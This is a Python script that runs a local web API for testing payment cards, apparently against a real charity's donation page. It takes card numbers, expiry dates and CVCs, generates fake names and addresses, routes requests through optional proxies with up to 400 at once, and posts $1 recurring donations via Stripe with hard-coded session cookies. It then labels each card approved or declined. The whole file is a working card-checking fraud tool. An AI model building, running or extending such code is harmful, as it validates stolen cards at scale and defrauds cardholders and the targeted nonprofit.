#!/usr/bin/env python3
"""
Stripe Charge 1$ API | EXACT Logic from Original File | Only Charge Endpoint
"""

import asyncio
import aiohttp
import json
import random
import re
import string
import time
import uuid
from datetime import datetime
from typing import Dict, Optional
import socket
from aiohttp import web
import urllib.parse

# ========== CONFIGURATION ==========
CONFIG = {
    "max_concurrent": 400,
    "port": 8000,
    "name": "Stripe Charge 1$ API",
    "version": "1.0"
}

# ========== COLOR CODES ==========
O = '\033[1;31m'  # Red
Z = '\033[1;37m'  # White
F = '\033[1;32m'  # Green
B = '\033[2;36m'  # Light Blue
X = '\033[1;33m'  # Yellow
C = '\033[2;35m'

# ========== REQUEST COUNTER ==========
request_counter = 0

# ========== HELPER FUNCTIONS (EXACT from original) ==========

def generate_full_name():
    """EXACT function from original file"""
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", 
                   "Youssef", "Nour", "Hannah", "Yara", "Khaln", "ed", "Sara", "Lina", 
                   "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", 
                   "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", 
                   "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", 
                   "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", 
                   "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", 
                   "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", 
                   "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", 
                   "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", 
                   "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", 
                  "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", 
                  "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", 
                  "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", 
                  "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", 
                  "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
                  "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", 
                  "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", 
                  "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", 
                  "Ward", "Watson", "Webb", "White", "Young"]
    
    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    return first_name, last_name

def generate_address():
    """EXACT function from original file"""
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", 
              "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", 
               "Washington St", "Lake St", "Hill St", "Maple St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]

    return city, state, street_address, zip_code

def generate_random_account():
    """EXACT function from original file"""
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_phone():
    """EXACT function from original file"""
    number = ''.join(random.choices(string.digits, k=7))
    return f"303{number}"

def parse_cc(cc_string):
    """Parse CC from file line format"""
    parts = cc_string.replace('\n', '').split('|')
    if len(parts) >= 4:
        return {
            'number': parts[0],
            'month': parts[1],
            'year': parts[2][-2:],  # Get last 2 digits of year
            'cvc': parts[3].replace('\n', '')
        }
    raise ValueError("Invalid CC format. Use: num|mm|yy|cvc")

# ========== PROXY TESTER ==========

async def test_proxy(session, proxy: str) -> tuple:
    """Test if proxy is working"""
    try:
        proxy_url = f"http://{proxy}" if not proxy.startswith(('http://', 'https://')) else proxy
        async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=5) as response:
            if response.status == 200:
                data = await response.json()
                return True, "Live", data.get('origin')
            return False, "Dead", None
    except Exception as e:
        return False, f"Dead", None

# ========== STRIPE CHARGER (EXACT LOGIC) ==========

class StripeCharger:
    """EXACT logic from original file"""
    
    def __init__(self, proxy: str = None):
        self.proxy = proxy
        self.session = None
        self.proxy_url = f"http://{proxy}" if proxy and not proxy.startswith(('http://', 'https://')) else proxy
        
        # EXACT cookies from original
        self.yaram = {
            'pow': '4922',
            'pow_ts': '1765678890',
            'pow_target': 'Mozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
            'pow_diff': '3',
            'pow_sig': '1f2ff6d448cff3393448937fe0973d6d1ca1ca98d0e742b598417e0df09db65f',
            'pow_ver': 'v3',
            'charitable_session': 'c367ed103a782e0e8516bbd5c71ac264||86400||82800',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-12-14%2002%3A21%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2F',
            'sbjs_first_add': 'fd%3D2025-12-14%2002%3A21%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2F',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
            'tk_ai': 'NwE0IRBOWiCHsw6DquLinoyg',
            '__stripe_mid': 'dd1cf2bd-d793-4dc5-b60e-faf952c9a4731955c1',
            '__stripe_sid': 'b081920f-09ae-4e5a-9521-b0e96396026f5f3300',
            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2Fdonate%2F',
        }
        
        # EXACT headers from original
        self.yaram2 = {
            'authority': 'pipelineforchangefoundation.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://pipelineforchangefoundation.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        # EXACT headers for ajax from original
        self.headersex = {
            'authority': 'pipelineforchangefoundation.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://pipelineforchangefoundation.com',
            'referer': 'https://pipelineforchangefoundation.com/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        # EXACT headers for stripe from original
        self.am1 = {
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://js.stripe.com/',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }
    
    async def __aenter__(self):
        """Create session"""
        conn = aiohttp.TCPConnector(limit=0, ssl=False)
        self.session = aiohttp.ClientSession(connector=conn)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def charge(self, cc_string: str) -> dict:
        """EXACT charging logic from original file"""
        start_time = time.time()
        
        try:
            # Parse CC
            n, mm, yy, cvc = cc_string.split('|')
            yy = yy[-2:] if len(yy) > 2 else yy
            cvc = cvc.replace('\n', '')
            
            # Generate random data
            first_name, last_name = generate_full_name()
            acc = generate_random_account()
            phone = generate_phone()
            city, state, street_address, zip_code = generate_address()
            
            # STEP 1: Get donate page
            response = await self.session.get(
                'https://pipelineforchangefoundation.com/donate/', 
                cookies=self.yaram, 
                headers=self.yaram2,
                proxy=self.proxy_url
            )
            html = await response.text()
            
            # Extract data using regex (EXACT from original)
            formid_match = re.search(r'name="charitable_form_id" value="(.*?)"', html)
            nonce_match = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', html)
            cap_match = re.search(r'name="campaign_id" value="(.*?)"', html)
            pk_live_match = re.search(r'"key":"(.*?)"', html)
            
            if not all([formid_match, nonce_match, cap_match, pk_live_match]):
                return {
                    "cc": cc_string,
                    "status": "error",
                    "message": "Failed to extract required data",
                    "live": False,
                    "time": int((time.time() - start_time) * 1000)
                }
            
            formid = formid_match.group(1)
            nonce = nonce_match.group(1)
            cap = cap_match.group(1)
            pk_live = pk_live_match.group(1)
            
            # STEP 2: Create payment method with Stripe (EXACT string format from original)
            ftxbaba = f'type=card&billing_details[name]={first_name}+{last_name}&billing_details[email]={acc}&billing_details[address][city]=New+york&billing_details[address][country]=US&billing_details[address][line1]=New+york+new+states+1000&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=012434816444&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=beb24868-9013-41ea-9964-7917dbbc35582418cf&muid=dd1cf2bd-d793-4dc5-b60e-faf952c9a4731955c1&sid=911f35c9-ecd0-4925-8eea-5f54c9676f2a227523&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&referrer=https%3A%2F%2Fpipelineforchangefoundation.com&time_on_page=168797&client_attribution_metadata[client_session_id]=2ca8389d-11fd-4b6f-a26a-d076cf9164a8&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk_live}'
            
            yarak3 = await self.session.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=self.am1, 
                data=ftxbaba,
                proxy=self.proxy_url
            )
            
            pm_response = await yarak3.json()
            
            if 'id' not in pm_response:
                return {
                    "cc": cc_string,
                    "status": "error",
                    "message": f"Stripe error: {pm_response.get('error', {}).get('message', 'Unknown')}",
                    "live": False,
                    "time": int((time.time() - start_time) * 1000)
                }
            
            pm_id = pm_response['id']
            
            # STEP 3: Process donation (EXACT from original)
            am2 = {
                'charitable_form_id': formid,
                formid: '',
                '_charitable_donation_nonce': nonce,
                '_wp_http_referer': '/donate/',
                'campaign_id': cap,
                'description': 'Donate to Pipeline for Change Foundation',
                'ID': '742502',
                'recurring_donation': 'yes',
                'donation_amount': 'recurring-custom',
                'custom_recurring_donation_amount': '1.00',
                'recurring_donation_period': 'week',
                'custom_donation_amount': '1.00',
                'first_name': 'ftx',
                'last_name': first_name,
                'email': acc,
                'address': 'ftxbabatek nea ',
                'address_2': '',
                'city': 'new york',
                'state': '100p',
                'postcode': '10080',
                'country': 'US',
                'phone': '02026726732',
                'gateway': 'stripe',
                'stripe_payment_method': pm_id,
                'action': 'make_donation',
                'form_action': 'make_donation',
            }
            
            r4 = await self.session.post(
                'https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php',
                cookies=self.yaram,
                headers=self.headersex,
                data=am2,
                proxy=self.proxy_url
            )
            
            r4_text = await r4.text()
            time_taken = int((time.time() - start_time) * 1000)
            
            # Check response (EXACT from original)
            if 'Thank you for your donation' in r4_text or 'Thank you' in r4_text or 'Successfully' in r4_text:
                return {
                    "cc": cc_string,
                    "status": "approved",
                    "message": "Charge successful",
                    "live": True,
                    "pm_id": pm_id[:10] + "..." + pm_id[-6:] if pm_id else None,
                    "time": time_taken
                }
            elif 'requires_action' in r4_text:
                return {
                    "cc": cc_string,
                    "status": "requires_action",
                    "message": "3D Secure required",
                    "live": False,
                    "time": time_taken
                }
            else:
                try:
                    ftx = await r4.json()
                    error_msg = str(ftx.get('errors', 'Transaction declined'))
                except:
                    error_msg = "Transaction declined"
                
                return {
                    "cc": cc_string,
                    "status": "declined",
                    "message": error_msg,
                    "live": False,
                    "time": time_taken
                }
                
        except Exception as e:
            time_taken = int((time.time() - start_time) * 1000)
            return {
                "cc": cc_string,
                "status": "error",
                "message": str(e)[:100],
                "live": False,
                "time": time_taken
            }

# ========== API HANDLER ==========

semaphore = asyncio.Semaphore(CONFIG["max_concurrent"])

async def charge_handler(request):
    """Handle /charge?cc=...&proxy=... requests"""
    global request_counter
    request_counter += 1
    current_id = request_counter
    
    cc_param = request.query.get('cc', '')
    proxy_param = request.query.get('proxy', None)
    
    if not cc_param:
        return web.json_response({
            "error": "Missing cc parameter",
            "usage": "/charge?cc=4111111111111111|12|25|123&proxy=127.0.0.1:8080"
        }, status=400)
    
    # Validate CC format
    if '|' not in cc_param or len(cc_param.split('|')) < 4:
        return web.json_response({
            "error": "Invalid card format. Use: num|mm|yy|cvc"
        }, status=400)
    
    # Test proxy if provided
    proxy_status = "Not used"
    if proxy_param:
        try:
            async with aiohttp.ClientSession() as test_session:
                is_live, status_msg, proxy_ip = await test_proxy(test_session, proxy_param)
                proxy_status = status_msg
                
                if not is_live:
                    return web.json_response({
                        "request_id": current_id,
                        "cc": cc_param,
                        "status": "error",
                        "message": "Proxy is dead",
                        "proxy_status": proxy_status,
                        "live": False,
                        "time": 0
                    })
                print(f"{B}[{current_id}] Proxy: {proxy_param} - {proxy_status}{Z}")
        except Exception as e:
            proxy_status = "Test failed"
    
    # Use semaphore for concurrency control
    async with semaphore:
        print(f"{X}[{current_id}] Processing: {cc_param[:16]}... Proxy: {proxy_param if proxy_param else 'None'}{Z}")
        
        try:
            async with StripeCharger(proxy_param) as charger:
                result = await charger.charge(cc_param)
                
                # Add metadata
                result["request_id"] = current_id
                result["proxy_status"] = proxy_status
                result["charge_amount"] = "$1.00"
                
                # Color code based on status
                if result['status'] == 'approved':
                    print(f"{F}[{current_id}] ✅ APPROVED - {result['message']}{Z}")
                elif result['status'] == 'requires_action':
                    print(f"{X}[{current_id}] ⚠️ REQUIRES ACTION - {result['message']}{Z}")
                elif result['status'] == 'declined':
                    print(f"{O}[{current_id}] ❌ DECLINED - {result['message']}{Z}")
                else:
                    print(f"{O}[{current_id}] ❌ ERROR - {result['message']}{Z}")
                
                return web.json_response(result)
                
        except Exception as e:
            return web.json_response({
                "request_id": current_id,
                "cc": cc_param,
                "status": "error",
                "message": f"API Error: {str(e)[:100]}",
                "proxy_status": proxy_status,
                "live": False,
                "time": 0,
                "charge_amount": "$1.00"
            }, status=500)

# ========== MAIN ==========

async def main():
    """Start the API server"""
    print(F)
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║              STRIPE CHARGE 1$ API v1.0                      ║")
    print("║         400 Concurrent | EXACT Original Logic               ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(Z)
    
    # Get local IP
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except:
        local_ip = "127.0.0.1"
    
    # Setup app with ONLY charge endpoint
    app = web.Application()
    app.router.add_get('/charge', charge_handler)
    
    print(f"{F}✅ Server started successfully!{Z}")
    print(f"{X}📱 Local: http://localhost:{CONFIG['port']}/charge?cc=4111111111111111|12|25|123{Z}")
    print(f"{X}🌐 Network: http://{local_ip}:{CONFIG['port']}/charge?cc=4111111111111111|12|25|123{Z}")
    print(f"{C}🚀 Max concurrent: {CONFIG['max_concurrent']}{Z}")
    print(f"{B}📝 Using EXACT logic from original file{Z}")
    
    # Start server
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', CONFIG["port"])
    await site.start()
    
    # Keep running
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{O}⚠️ Server stopped by user{Z}")
    except Exception as e:
        print(f"\n{O}❌ Fatal error: {e}{Z}")